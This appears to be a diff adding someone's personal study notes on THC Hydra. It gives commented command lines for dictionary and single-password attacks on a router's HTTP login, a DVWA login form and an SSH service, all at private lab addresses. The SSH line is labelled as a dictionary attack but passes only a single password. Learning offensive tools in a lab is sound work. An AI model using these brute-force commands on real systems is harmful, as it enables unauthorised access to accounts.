@@ -1,0 +1,20 @@
+// Chris's notes on using THC Hydra
+
+# Cracking router login-page via hydra w/dictionary
+
+# Login pop-up
+hydra -l admin -P /dictionary.txt 192.168.1.1 http-get
+
+# Login Page where
+# http-post-form is type of request (seen in burpsuite)
+# /dvwa/login.php is page address (ie: 192.168.1.1/dvwa/login.php)
+# username is field name for username (seen in burpsuite and probably on page)
+# ^USER^ tells hydra to put the username there
+# same things with the password stuff
+# Login tells hydra that this is for failed logins
+# Login failed tells hydra that this is what those failed logins look like(burp)
+hydra -l admin -p password 192.168.1.1 http-post-form 
+"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+
+# Cracking ssh login with hydra w/dictionary
+hydra -l admin -p password 192.168.1.2 ssh
